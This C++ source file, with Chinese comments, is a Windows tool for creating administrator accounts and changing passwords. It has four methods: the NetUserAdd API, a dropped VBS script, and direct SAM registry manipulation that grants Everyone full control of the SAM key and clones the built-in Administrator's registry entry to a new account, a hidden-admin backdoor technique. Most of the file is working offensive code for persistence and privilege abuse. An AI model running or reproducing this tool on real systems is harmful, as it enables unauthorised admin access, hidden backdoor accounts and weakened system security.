#include <iostream>
#include <windows.h>
#include <winreg.h>
#include <stdio.h>
#include <Aclapi.h>
#include <lm.h>
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "netapi32.lib")
using namespace std;

// 回应信息
void resmessage(char *msg){
	printf("%s",msg);
	exit(1);
}

// wchar_t[] 转换成 char[]
wchar_t *c2wc(const char *Str){
    wchar_t *Wchar = new wchar_t[strlen(Str) + 1];
    mbstowcs(Wchar, Str, strlen(Str) + 1);
    return Wchar;
}

// [5]修改密码『用户权限』，不能修改他人的空密码
void _changePSW(wchar_t *name,wchar_t *oldpass,wchar_t *newpass){
   DWORD dwError = 0;
   NET_API_STATUS nStatus;
   // origin password is needed here
   nStatus = NetUserChangePassword(NULL, name, oldpass, newpass);
   if (nStatus == NERR_Success)
      resmessage("I did it!\n");
   else
      resmessage("I may have no right to do that...");
}

// [4]修改密码『需要管理员权限』
void changePSW(wchar_t *username,wchar_t *password){
   DWORD dwLevel = 1003;
   USER_INFO_1003 ui;
   NET_API_STATUS nStatus;

   ui.usri1003_password = password;
   nStatus = NetUserSetInfo(NULL,username,dwLevel,(LPBYTE)&ui,NULL);

   if (nStatus == NERR_Success)
	   wprintf(L"User [%s] has changed password to [%s]",username,password);
   else
	   wprintf(L"Failed!\nA system error has occurred, error %d\n", nStatus);
}

// [3]通过VBS加用户
void vbsAdd(char *username,char *password){
	FILE *fp=fopen("$e.vbs","w+");
	fprintf(fp,"Set o=CreateObject(\"Shell.Users\")\n");
	fprintf(fp,"Set z=o.create(\"%s\")\n",username);	//create user
	fprintf(fp,"z.changePassword \"%s\",\"\"\n",password);	//create password
	fprintf(fp,"z.setting(\"AccountType\")=3\n");	//set to be admin
	fclose(fp);
	system("cscript $e.vbs&del /q /f $e.vbs?");		//execute
}

// 设置注册表可写权限
int setPower(){
	DWORD dwRet;
	LPSTR SamName = "MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\";		//key info of system users
	PSECURITY_DESCRIPTOR pSD = NULL;
	PACL pOldDacl = NULL;
	PACL pNewDacl = NULL;
	EXPLICIT_ACCESS ea;
	HKEY hKey = NULL;

	// 获取SAM主键的DACL
	dwRet = GetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, &pSD);
	if (dwRet != ERROR_SUCCESS)
		return -1;

	// 创建一个ACE，允许Everyone完全控制对象，并允许子对象继承此权限
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	BuildExplicitAccessWithName(&ea, "Everyone",KEY_ALL_ACCESS,SET_ACCESS,SUB_CONTAINERS_AND_OBJECTS_INHERIT);

	// 将新的ACE加入DACL
	dwRet = SetEntriesInAcl(1, &ea, pOldDacl, &pNewDacl);

	// 更新Users主键的DACL
	dwRet = SetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
	if (dwRet != ERROR_SUCCESS)
		return -1;

	return 0;
}

// [2]通过操作注册表添加用户
void SetRegistryValue(char *username){
    HKEY hKey; 
    DWORD dwValue = 0;
	char temp[64];
	if(setPower()==-1)
		resmessage("Sorry,I have no right to do that...");
	// 新建或打开一个键
	sprintf(temp,"SAM\\SAM\\Domains\\Account\\Users\\Names\\%s",username);
	// create a key with your username
    if (RegCreateKey(HKEY_LOCAL_MACHINE, temp, &hKey) == ERROR_SUCCESS) {
        // 使用hKey操作hkey里面的值
		RegSetValueEx(hKey, "", 0, 0x3ff, (CONST BYTE*)&dwValue, 0);
    }
	else
		resmessage("Sorry,I can't do that...\n");
    RegCloseKey(hKey);
	system("reg copy HKLM\\SAM\\SAM\\Domains\\Account\\Users\\000001F4 HKLM\\SAM\\SAM\\Domains\\Account\\Users\\000003FF /f");
	// 实现RegCopyTree 的API要vista和2008才支持，只能用系统的reg命令了...
}

// [1]直接使用API添加用户
void apiAdd(wchar_t *name,wchar_t *pass){
   USER_INFO_1 ui;
   DWORD dwLevel = 1;
   DWORD dwError = 0;
   NET_API_STATUS nStatus;

   ui.usri1_name = name;
   ui.usri1_password = pass;
   ui.usri1_priv = USER_PRIV_USER;
   ui.usri1_home_dir = NULL;
   ui.usri1_comment = NULL;
   ui.usri1_flags = UF_SCRIPT;
   ui.usri1_script_path = NULL;
   // add user using figures behind
   nStatus = NetUserAdd(NULL,dwLevel,(LPBYTE)&ui,&dwError);

   if (nStatus == NERR_Success)
      wprintf(L"User %s has been successfully added\n",name);
   else
      printf("A system error has occurred: %d\n", nStatus);

	wchar_t szAccountName[100]={0};
	wcscpy(szAccountName,ui.usri1_name);
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName;
	// add to administrators' group
	nStatus = NetLocalGroupAddMembers(NULL,L"Administrators",3,(LPBYTE)&account,1);
	if (nStatus == ERROR_SUCCESS)
      wprintf(L"User %s has been added to administrators\n",name);
	else
      printf("Fail to add %s to administrators. Error code: %d...\n", name, nStatus);
}

// main
int main(int argc, char* argv[]){
	if(argc==4){
		char c=argv[1][0];
		switch(c){
			case 49:	apiAdd(c2wc(argv[2]),c2wc(argv[3]));break;
			case 50:	vbsAdd(argv[2],argv[3]);break;
			case 51:	SetRegistryValue(argv[2]);
						changePSW(c2wc(argv[2]),c2wc(argv[3]));break;
			case 52:	changePSW(c2wc(argv[2]),c2wc(argv[3]));break;
			default:	resmessage("Usage: [1-5] [username] [password]\n");break;
		}
	}
	else if(argc==5)
		_changePSW(c2wc(argv[2]),c2wc(argv[3]),c2wc(argv[4]));
	else
		resmessage("Usage:  [1] [UserName] [Password]   //Using API\n\t[2] [UserName] [Password]   //Using VBS\n\t[3] [UserName] [Password]   //Using REG\n\t[4] [UserName] [Password]   //Change password (for admin)\n\t[5] [UserName] [OldPass] [NewPass]   //Change password (for everyone)\n");
    return 0;
}
